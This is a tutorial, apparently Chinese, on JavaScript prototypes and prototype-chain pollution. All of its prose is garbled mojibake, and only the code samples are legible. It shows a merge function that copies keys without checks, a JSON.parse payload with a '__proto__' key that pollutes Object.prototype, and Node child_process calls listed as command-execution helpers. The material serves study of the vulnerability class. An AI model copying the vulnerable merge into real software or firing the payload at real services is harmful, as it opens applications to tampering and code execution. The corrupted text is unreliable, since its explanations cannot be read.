<p>å¯åŠ¨æ•°æ®åº“ æŸ¥ä¸€ä¸‹<br>ç„¶åç”¨ sql.js æŸ¥ä¸€ä¸‹ æ‰€ä»¥å¯ä»¥é€šè¿‡ä¿®æ”¹<br>é‡Œé¢çš„ sql=â€™æŸ¥è¯¢è¯­å¥â€™å°±å¯ä»¥è¿›è¡Œæ•°æ®åº“æ“ä½œäº†</p>
<p>é¡¹ç›®</p>
<p>ä¹Ÿå¯ä»¥ nodejs å®‰è£… MongoDB æ¥å¯¹æ•°æ®åº“è¿›è¡Œæ“ä½œ</p>
<h1 id="Prototype-Pollution-Attack"><a href="#Prototype-Pollution-Attack" class="headerlink" title="Prototype Pollution Attack"></a>Prototype Pollution Attack</h1><p>å¸¸ç”¨çš„æ‰§è¡Œå‡½æ•°</p>
<blockquote>
<p>require(â€˜child_processâ€™).spawnSync(â€˜lsâ€™,[â€˜.â€™]).stdout.toString()</p>
<p>stdout ç”¨æ¥æ•è·è¾“å‡º</p>
<p>è¿˜æœ‰ execï¼ŒexecSyncï¼Œspawnï¼ŒspawnSync(è¿™ä¸¤ä¸ªéœ€è¦ stdout æ¥æ•è·è¾“å‡º)</p>
</blockquote>
<h2 id="JavaScript-ä¸­çš„å¯¹è±¡"><a href="#JavaScript-ä¸­çš„å¯¹è±¡" class="headerlink" title="JavaScript ä¸­çš„å¯¹è±¡"></a>JavaScript ä¸­çš„å¯¹è±¡</h2><h3 id="å»ºç«‹å¯¹è±¡"><a href="#å»ºç«‹å¯¹è±¡" class="headerlink" title="å»ºç«‹å¯¹è±¡"></a>å»ºç«‹å¯¹è±¡</h3><p>JavaScript ä¸­ å»ºç«‹å¯¹è±¡æœ‰ä¸¤ç§å½¢å¼</p>
<ul>
<li>æ„é€ å‡½æ•°åˆ›å»º</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">student</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">this</span>.name = <span class="hljs-string">&quot;Yuyan Peng&quot;</span>;<br>    <span class="hljs-built_in">this</span>.test = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">2333</span>;<br>    &#125;<br>&#125;<br>student.prototype.a=<span class="hljs-number">3</span>;<br>stu = <span class="hljs-keyword">new</span> student();<br><span class="hljs-built_in">console</span>.log(stu.test());<br><span class="hljs-built_in">console</span>.log(stu.a);<br></code></pre></td></tr></table></figure>

<ul>
<li>é€šè¿‡ Object åˆ›å»º</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> a = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>();<br>a.c=<span class="hljs-number">3</span><br><span class="hljs-built_in">console</span>.log(a.c)<br></code></pre></td></tr></table></figure>

<p>å¯¹äºä½¿ç”¨è¿‡åŸºäºç±»çš„è¯­è¨€ (å¦‚ Java æˆ– C++) çš„å¼€å‘äººå‘˜æ¥è¯´ï¼ŒJavaScript æœ‰ç‚¹ä»¤äººå›°æƒ‘ï¼Œå› ä¸ºå®ƒæ˜¯åŠ¨æ€çš„ï¼Œå¹¶ä¸”æœ¬èº«ä¸æä¾›ä¸€ä¸ª class å®ç°ã€‚ï¼ˆåœ¨ ES2015/ES6 ä¸­å¼•å…¥äº† class å…³é”®å­—ï¼Œä½†é‚£åªæ˜¯è¯­æ³•ç³–ï¼ŒJavaScript ä»ç„¶æ˜¯åŸºäºåŸå‹çš„ï¼‰ã€‚ ä¹‹å‰æˆ‘ä»¬æ‰€è®¤ä¸ºçš„ç±»åœ¨ js ä¸­éƒ½æ˜¯ç”¨å‡½æ•°æ¥å£°æ˜çš„ ï¼ˆäº‹å®ä¸Š js ä¸æ‰¿è®¤ç±» åªæ˜¯æœ‰ç›¸åº”çš„æ¦‚å¿µè€Œå·² ä¸‹é¢ä¸ºäº†è¯´æ˜æ–¹ä¾¿ éƒ½æ²¿ç”¨ç±»çš„è¯´æ³•ï¼‰ ä¸¾ä¸ªæ —å­</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf">function testï¼ˆï¼‰&#123;<br>    this.a = <span class="hljs-string">&quot;joy&quot;</span><span class="hljs-comment">;</span><br>&#125;<br><br><span class="hljs-attribute">b</span> = new test<span class="hljs-comment">;</span><br>console.log(b.a)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<p>ä»ä¸Šé¢å¯ä»¥çœ‹åˆ° å®ä¾‹åŒ–å¯¹è±¡ b åå°±å¯ä»¥è¾“å‡º test ç±»çš„å±æ€§ a äº† æˆ‘ä»¬å…¶å®å¾ˆå®¹æ˜“æƒ³åˆ°æ„é€ å‡½æ•° æ„é€ å‡½æ•°å°±æ˜¯åœ¨ new ä¸€ä¸ªå¯¹è±¡çš„æ—¶å€™è¢«è°ƒç”¨ åœ¨è¿™å…¶å®å°±æ˜¯ js çš„ä¸€ä¸ªé‡è¦æ¦‚å¿µâ€”â€”ç»§æ‰¿ï¼Œç»§æ‰¿çš„æ•´ä¸ªå¯¹åº”å…³ç³»å°±æ˜¯è¿™ä¸ªå¯¹è±¡çš„åŸå‹é“¾ æ‰€ä»¥ <code>test()å‡½æ•°å°±æ˜¯ç±»testçš„æ„é€ å‡½æ•°</code></p>
<p>ä¸Šé¢æ²¡é—®é¢˜æˆ‘ä»¬ç»§ç»­ï¼š</p>
<h3 id="prototype-å’Œproto"><a href="#prototype-å’Œproto" class="headerlink" title="prototype å’Œproto"></a>prototype å’Œ<strong>proto</strong></h3><p>ä¸€ä¸ªç±»ä¸­å¿…å®šæœ‰ä¸€äº›æ–¹æ³•æ¯”å¦‚è¯´å±æ€§ this.age æŠŠæ–¹æ³•å®šä¹‰åœ¨æ„é€ å‡½æ•°å†…éƒ¨ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">student</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">this</span>.age=<span class="hljs-number">19</span>;<br>    <span class="hljs-built_in">this</span>.show=<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">this</span>.age)<br>        &#125;<br>    &#125;<br><br>(<span class="hljs-keyword">new</span> student).show();<br></code></pre></td></tr></table></figure>

<p>å†ä¸€æ¬¡çœ‹åˆ° new ä¸€ä¸ªå¯¹è±¡å°±ä¼šç»§æ‰¿åˆ°å®ƒçš„å±æ€§ åœ¨æ–°å¼€è¾Ÿçš„å­˜å‚¨ç©ºé—´å°±å·²ç»å­˜æ”¾æœ‰å¯¹åº”çš„å±æ€§äº†</p>
<p>ä½†è¿™æ ·å†™æœ‰ä¸€ä¸ªé—®é¢˜ æ¯å½“æˆ‘éœ€è¦åˆ›å»ºä¸€ä¸ª student å¯¹è±¡çš„æ—¶å€™ this.show = function{â€¦}å°±ä¼šæ‰§è¡Œä¸€æ¬¡ è¿™ä¸ª show æ–¹æ³•æ˜¯ç»‘å®šåœ¨å¯¹è±¡ä¸Šçš„ è€Œä¸æ˜¯ç»‘å®šåœ¨â€œç±»â€ä¸Šçš„</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> prototype<pre><code>ç”¨åŸå‹ prototype å®ç°
</code></pre>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Student</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">this</span>.age=<span class="hljs-number">19</span>;<br>&#125;<br><br>Student.prototype.show = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">this</span>.age)&#125;<br><br><span class="hljs-keyword">var</span> stu = <span class="hljs-keyword">new</span> Student;<br>stu.show();<br></code></pre></td></tr></table></figure>

<p>prototype æ˜¯ç±» Student çš„ä¸€ä¸ªå±æ€§ æ‰€æœ‰ç±»å¯¹è±¡åœ¨å®ä¾‹åŒ–åéƒ½å…·æœ‰å’Œ prototype ä¸­çš„å˜é‡ã€å±æ€§å’Œæ–¹æ³• åŒæ—¶åªæœ‰ç±»æ‰æœ‰ prototype å±æ€§ï¼Œä½†æ˜¯ç±»<code>å®ä¾‹åŒ–å‡ºæ¥çš„å¯¹è±¡</code>å´æ²¡æœ‰ prototype ä¸èƒ½é€šè¿‡ prototype è®¿é—®å®ä¾‹åŒ–å¯¹è±¡çš„åŸå‹</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> __proto__<pre><code>å°±ä¸Šä¾‹è€Œè¨€ æˆ‘ä»¬å¯ä»¥é€šè¿‡ Student.prototype è®¿é—® Student ç±»çš„åŸå‹ ä½†æ˜¯å®ä¾‹åŒ–åçš„å¯¹è±¡ stu æ˜¯ä¸èƒ½é€šè¿‡ prototype è®¿é—®åŸå‹çš„ è¿™æ—¶å€™æˆ‘ä»¬ä½¿ç”¨\_\_proto\_\_æ¥è®¿é—®å®ä¾‹åŒ–å¯¹è±¡çš„åŸå‹ stu.\_\_proto\_\_==Student.prototype çœ‹åˆ°äºŒè€…æ˜¯ç­‰ä»·çš„
</code></pre>
</li>
</ul>
<p><strong>åœ¨ Java.Script ä¸­ ä¸‡ç‰©çš†å¯¹è±¡</strong><br>æ‰€æœ‰çš„å˜é‡ï¼Œå‡½æ•°ï¼Œæ•°ç»„ï¼Œå¯¹è±¡éƒ½å§‹äº Object çš„åŸå‹å³ Object.prototype å¯¹è±¡çš„__proto__å’Œç±»çš„ prototype ç›¸å¯¹åº”</p>
<p>ç‰¹åˆ«çš„ å‡½æ•°ä¹Ÿå¯ä»¥ä½¿ç”¨__proto__å› ä¸ºå‡½æ•°ä¹Ÿæ˜¯å¯¹è±¡ åé¢ç»™äºˆè¯´æ˜</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/n.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="åŸå‹é“¾"><a href="#åŸå‹é“¾" class="headerlink" title="åŸå‹é“¾"></a>åŸå‹é“¾</h3><p>åœ¨ javascript ä¸­ æ¯ä¸ªå¯¹è±¡çš„éƒ½æœ‰ä¸€ä¸ªæŒ‡å‘ä»–çš„åŸå‹(prototype)çš„å†…éƒ¨é“¾æ¥ è¿™ä¸ªåŸå‹å¯¹è±¡åˆæœ‰å®ƒè‡ªå·±çš„åŸå‹ï¼Œç›´åˆ° null ä¸ºæ­¢</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">function</span> <span class="hljs-constructor">Pt()</span>&#123;<br>    this.b = <span class="hljs-string">&quot;I don&#x27;t know what I&#x27;m up to.&quot;</span><br>&#125;<br><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Pt</span>.</span></span>prototype;<br><br>var ppt = <span class="hljs-keyword">new</span> Pt;<br>ppt.__proto__;<br>ppt.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__proto__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__proto__</span>;</span></span><br><br></code></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹å‡ºåŸå‹é“¾ä¸º ppt-&gt;Pt.prototype-&gt;Object.prototype-&gt;null</p>
<p>æ•°ç»„<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/%E5%8E%9F%E5%9E%8B%E9%93%BE2.png" srcset="/img/loading.gif" lazyload><br>åŸå‹é“¾ c-&gt;array.prototype-&gt;Object.prototype-&gt;null<br>å‡½æ•°<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/%E5%8E%9F%E5%9E%8B%E9%93%BE3.png" srcset="/img/loading.gif" lazyload><br>åŸå‹é“¾ d-&gt;function.prototype-&gt;Object.prototype-&gt;null</p>
<p>å¯è§ js ä¸­ä¸€åˆ‡çš†å¯¹è±¡ ä¸€åˆ‡éƒ½å§‹äº Object.prototype</p>
<p>æ€»ç»“ä¸€ä¸‹ï¼š</p>
<ul>
<li>prototype æ˜¯ç±»çš„å±æ€§ æ‰€æœ‰ç±»å¯¹è±¡å®ä¾‹åŒ–éƒ½ä¼šä» prototype ç»§æ‰¿å±æ€§å’Œæ–¹æ³•</li>
<li>ä¸€ä¸ªå¯¹è±¡çš„__proto__å±æ€§æŒ‡å‘è¿™ä¸ªå®ä¾‹åŒ–è¿™ä¸ªå¯¹è±¡çš„ç±»çš„ prototype å±æ€§</li>
</ul>
<p><code>instanceofè¿ç®—ç¬¦</code>ï¼Œå®ƒå¯ä»¥ç”¨æ¥åˆ¤æ–­æŸä¸ªæ„é€ å‡½æ•°çš„ prototype å±æ€§æ˜¯å¦å­˜åœ¨å¦å¤–ä¸€ä¸ªè¦æ£€æµ‹å¯¹è±¡çš„åŸå‹é“¾ï¼Œä¸‹é¢æ˜¯ instanceof è¿ç®—ç¬¦çš„ä¸€ä¸ªå®ä¾‹</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Pt</span>(<span class="hljs-params"></span>)</span>&#123;&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Ob</span>(<span class="hljs-params"></span>)</span>&#123;&#125;<br><br><span class="hljs-keyword">var</span> ppt = <span class="hljs-keyword">new</span> Pt;<br><span class="hljs-built_in">console</span>.info(ppt <span class="hljs-keyword">instanceof</span> Pt)<span class="hljs-comment">//true //ppt.__proto__===Pt.prototype</span><br><span class="hljs-built_in">console</span>.info(ppt <span class="hljs-keyword">instanceof</span> ob)<span class="hljs-comment">//false å› ä¸ºå¯¹è±¡pptçš„åŸå‹ä¸æ˜¯Ob</span><br></code></pre></td></tr></table></figure>

<p>ä¸Šé¢è¯´åˆ°å‡½æ•°ä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hello</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">this</span>.test = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;hello world&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2333</span>;<br>    &#125;<br><br><span class="hljs-keyword">var</span> lib = <span class="hljs-keyword">new</span> hello;<br>lib.test();<br><br><span class="hljs-built_in">console</span>.log(hello <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Object</span>)<span class="hljs-comment">//ture å¾—è¯</span><br></code></pre></td></tr></table></figure>

<h3 id="åŸå‹é“¾çš„å˜é‡æœç´¢"><a href="#åŸå‹é“¾çš„å˜é‡æœç´¢" class="headerlink" title="åŸå‹é“¾çš„å˜é‡æœç´¢"></a>åŸå‹é“¾çš„å˜é‡æœç´¢</h3><p>æ¥çœ‹ä¸€ä¸ªä¾‹å­</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">I</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">this</span>.a = <span class="hljs-string">&quot;abc&quot;</span>;<br>    <span class="hljs-built_in">this</span>.b = <span class="hljs-string">&quot;123&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">var</span> j = <span class="hljs-keyword">new</span>(I);<br>I.prototype.c = <span class="hljs-string">&quot;789&quot;</span>;<br><span class="hljs-built_in">console</span>.log(j.c);<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211119005530731.png" srcset="/img/loading.gif" lazyload alt="image-20211119005530731"><br>èƒ½çœ‹å‡ºä»€ä¹ˆ</p>
<p>å®ä¾‹åŒ– I åï¼Œå¯¹è±¡ j ä¸åº”è¯¥æœ‰å±æ€§ cï¼Œä½†æ­¤æ—¶ç»™ç±»å¯¹è±¡ I æ–°å¢ä¸€ä¸ªå±æ€§æ—¶ï¼Œåœ¨ j ä¸­ä¹Ÿæœ‰äº† c å±æ€§ï¼Œè¿™æ˜¯ç±»ä¸å¯¹è±¡ä¸­ä»æœªè§è¿‡çš„</p>
<p>å½“è¦ä½¿ç”¨æˆ–è¾“å‡ºä¸€ä¸ªå˜é‡æ—¶ï¼šé¦–å…ˆä¼šåœ¨æœ¬å±‚ä¸­æœç´¢ç›¸åº”çš„å˜é‡ï¼Œå¦‚æœä¸å­˜åœ¨çš„è¯ï¼Œå°±ä¼šå‘ä¸Šæœç´¢ï¼Œå³åœ¨è‡ªå·±çš„çˆ¶ç±»ä¸­æœç´¢ï¼Œå½“çˆ¶ç±»ä¸­ä¹Ÿæ²¡æœ‰æ—¶ï¼Œå°±ä¼šå‘ç¥–çˆ¶ç±»æœç´¢ï¼Œç›´åˆ°æŒ‡å‘ nullï¼Œå¦‚æœæ­¤æ—¶è¿˜æ²¡æœ‰æœç´¢åˆ°ï¼Œå°±ä¼šè¿”å› undefined</p>
<p>é‚£ä¹ˆæ­¤æ—¶çš„åŸå‹é“¾å°±æ˜¯ j-&gt;I.prototype-&gt;Object.prototype-&gt;null</p>
<p>js çš„è¿™ä¸ªæŸ¥æ‰¾æœºåˆ¶ å°±æ˜¯è¿ç”¨åœ¨é¢å‘å¯¹è±¡çš„ç»§æ‰¿ä¸­ ç§°ä½œ prototype ç»§æ‰¿é“¾</p>
<p>â­ è¯´åˆ°è¿™é‡Œå†ä¸€æ¬¡æ€»ç»“å¦‚ä¸‹</p>
<ul>
<li>æ¯ä¸ªæ„é€ å‡½æ•°(constructor)éƒ½æœ‰ä¸€ä¸ªåŸå‹å¯¹è±¡(prototype)</li>
<li>å¯¹è±¡çš„__proto__å±æ€§ï¼ŒæŒ‡å‘ç±»çš„åŸå‹å¯¹è±¡ prototype</li>
<li>JavaScript ä½¿ç”¨ prototype é“¾å®ç°ç»§æ‰¿æœºåˆ¶</li>
</ul>
<h3 id="åŸå‹é“¾æ±¡æŸ“"><a href="#åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="åŸå‹é“¾æ±¡æŸ“"></a>åŸå‹é“¾æ±¡æŸ“</h3><p>ä¸‹é¢æˆ‘ä»¬æ¥çœ‹</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">var Student = &#123;age:<span class="hljs-number">19</span>&#125;<br><br>console.log(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Student</span>.</span></span>age)<br><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Student</span>.</span><span class="hljs-module"><span class="hljs-identifier">__proto__</span>.</span></span>age = <span class="hljs-number">20</span><br><br>console.log(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Student</span>.</span></span>age)<br><br>var Teacher = &#123;&#125;<br><br>console.log(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Teacher</span>.</span></span>age)<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93.png" srcset="/img/loading.gif" lazyload></p>
<p>åŸå‹é“¾ï¼šStudent.__proto__-&gt;Object.prototype-&gt;null</p>
<p>éšç€ä¸Šé¢çš„é€æ­¥æ¢è®¨ åŸå‹é“¾æ±¡æŸ“åŠå…¶äº§ç”Ÿçš„æ¼æ´ä¹Ÿå°±å‘¼ä¹‹æ¬²å‡ºäº† æˆ‘ä»¬é€šè¿‡æ§åˆ¶çˆ¶ç±»ç”šè‡³ç¥–ç±»çš„å±æ€§(ä¿®æ”¹è¿™ä¸ªå¯¹è±¡çš„åŸå‹)å°±å¯ä»¥å½±å“æ¥è‡ªåŒä¸€ä¸ªç±»ã€çˆ¶ç¥–ç±»çš„å¯¹è±¡ è¿™å°±æ˜¯åŸå‹é“¾æ±¡æŸ“</p>
<p>çœ‹ä¸€ä¸ªä¾‹å­</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-comment">//First.aæˆ–è€…First[&#x27;a&#x27;]å¯¹æ•°ç»„å…ƒç´ çš„è®¿é—®</span><br><span class="hljs-number">1.</span><br><span class="hljs-keyword">var</span> <span class="hljs-built_in">First</span> = Array();<br><span class="hljs-built_in">First</span>[<span class="hljs-string">&#x27;aa&#x27;</span>] = <span class="hljs-string">&quot;aaa&quot;</span>;<br><span class="hljs-built_in">First</span>[<span class="hljs-string">&#x27;bb&#x27;</span>] = <span class="hljs-string">&quot;bbb&quot;</span>;<br><span class="hljs-built_in">First</span>.aa<br><span class="hljs-built_in">First</span>.bb<br><br><span class="hljs-number">2.</span><br><span class="hljs-keyword">var</span> <span class="hljs-built_in">Second</span> = &#123;<span class="hljs-string">&quot;c&quot;</span>:<span class="hljs-string">&quot;ccc&quot;</span>,<span class="hljs-string">&quot;d&quot;</span>:<span class="hljs-string">&quot;ddd&quot;</span>&#125;<br>typeof <span class="hljs-built_in">Second</span>;<br><span class="hljs-built_in">Second</span>.c<br><span class="hljs-built_in">Second</span>[<span class="hljs-string">&#x27;c&#x27;</span>]<br></code></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„ prototype æ˜¯ä¸€æ ·çš„<br>çœ‹ä¸€ç»„ Second.__proto__==Second[â€œ__proto__â€œ]=Object.prototype</p>
<p>æ‰€ä»¥è¯´ï¼ŒåŸå‹é“¾æ±¡æŸ“ä¸€èˆ¬ä¼šå‡ºç°åœ¨å¯¹è±¡ã€æˆ–æ•°ç»„çš„é”®åæˆ–å±æ€§åå¯æ§,è€Œä¸”æ˜¯èµ‹å€¼è¯­å¥çš„æƒ…å†µä¸‹ ä¸‹é¢æ˜¯ä¸ªå¤±è´¥æ¡ˆä¾‹</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">function <span class="hljs-keyword">merge</span>(target, source)&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> <span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> source)&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> source &amp;&amp; <span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> target)&#123;<br>            <span class="hljs-keyword">merge</span>(target[<span class="hljs-keyword">key</span>], source[<span class="hljs-keyword">key</span>])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>                target[<span class="hljs-keyword">key</span>] = source[<span class="hljs-keyword">key</span>]<br>        &#125;<br>     &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¯•ä¸€ä¸‹</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">let</span> o<span class="hljs-number">1</span> = &#123;&#125;<br><span class="hljs-attribute">let</span> o<span class="hljs-number">2</span> = &#123;a: <span class="hljs-number">1</span>,<span class="hljs-string">&quot;__proto__&quot;</span>: &#123;b: <span class="hljs-number">2</span>&#125;&#125;<br><span class="hljs-attribute">merge</span>(o<span class="hljs-number">1</span>, o<span class="hljs-number">2</span>)<br><span class="hljs-attribute">console</span>.log(o<span class="hljs-number">1</span>.a, o<span class="hljs-number">1</span>.b)<br><span class="hljs-attribute">o3</span> = &#123;&#125;<br><span class="hljs-attribute">console</span>.log(o<span class="hljs-number">3</span>.b)<br></code></pre></td></tr></table></figure>

<p>å“‘ç«äº†ï¼Œpayload å¹¶æ²¡æœ‰è¾¾åˆ°æˆ‘ä»¬çš„é¢„æœŸï¼Œç”¨ JavaScript åˆ›å»º o2 çš„è¿‡ç¨‹ï¼ˆlet o2 = {a: 1, â€œ__proto__â€œ: {b: 2}}ï¼‰ä¸­ï¼Œ__proto__å·²ç»ä»£è¡¨ o2 çš„åŸå‹äº†ï¼Œæˆ‘ä»¬çš„é”®å€¼ç›¸å½“äºè‡ªå®šä¹‰äº†ä¸€ä¸ªåŸå‹å¯¹è±¡ï¼Œæ²¡æ³•åœ¨æ–°çš„å¯¹è±¡ä¸­æ·»åŠ __proto__é”®å€¼ï¼Œæ­¤æ—¶éå† o2 çš„æ‰€æœ‰é”®åï¼Œæ‹¿åˆ°çš„åªæ˜¯[a, b]ï¼Œ__proto__å¹¶ä¸æ˜¯ä¸€ä¸ª keyï¼Œè‡ªç„¶ä¹Ÿä¸ä¼šä¿®æ”¹ Object çš„åŸå‹ã€‚</p>
<p>é‚£ä¹ˆï¼Œå¦‚ä½•è®©__proto__è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªé”®åå‘¢ï¼Ÿç”¨ JSON è§£æä¸€ä¸‹é”®å€¼å¯¹(JSON.parse ä¼šæŠŠä¸€ä¸ª json å­—ç¬¦ä¸² è½¬åŒ–ä¸º javascript çš„ object)ï¼Œå°†ä»£ç æ”¹æˆå¦‚ä¸‹ï¼š</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">let</span> o<span class="hljs-number">1</span> = &#123;&#125;<br><span class="hljs-attribute">let</span> o<span class="hljs-number">2</span> = JSON.parse(&#x27;&#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-number">2</span>&#125;&#125;&#x27;) //?æ•°ç»„å…ƒç´ åŒå¼•å·<br><span class="hljs-attribute">merge</span>(o<span class="hljs-number">1</span>, o<span class="hljs-number">2</span>)<br><span class="hljs-attribute">console</span>.log(o<span class="hljs-number">1</span>.a, o<span class="hljs-number">1</span>.b)<br><span class="hljs-attribute">o3</span> = &#123;&#125;<br><span class="hljs-attribute">console</span>.log(o<span class="hljs-number">3</span>.b)<br></code></pre></td></tr></table></figure>

